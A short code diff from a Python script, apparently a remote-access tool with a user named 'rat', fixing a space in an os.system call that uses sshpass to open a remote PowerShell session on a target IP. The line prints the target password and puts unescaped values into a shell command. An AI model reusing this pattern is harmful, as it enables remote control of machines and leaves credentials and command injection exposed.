@@ -80,7 +80,7 @@ def connect():
     print(repr(target_password))
     print(repr(ipv4))
     #REMOTLY CORRECT
-    os.system(f"sshpass -p \"{target_password}\" ssh rat@{ipv4}'powershells'")
+    os.system(f"sshpass -p \"{target_password}\" ssh rat@{ipv4} 'powershells'")
     pause
     #target = SSHClient()
     #target.connect(ipv4, username='rat', password=target_password)
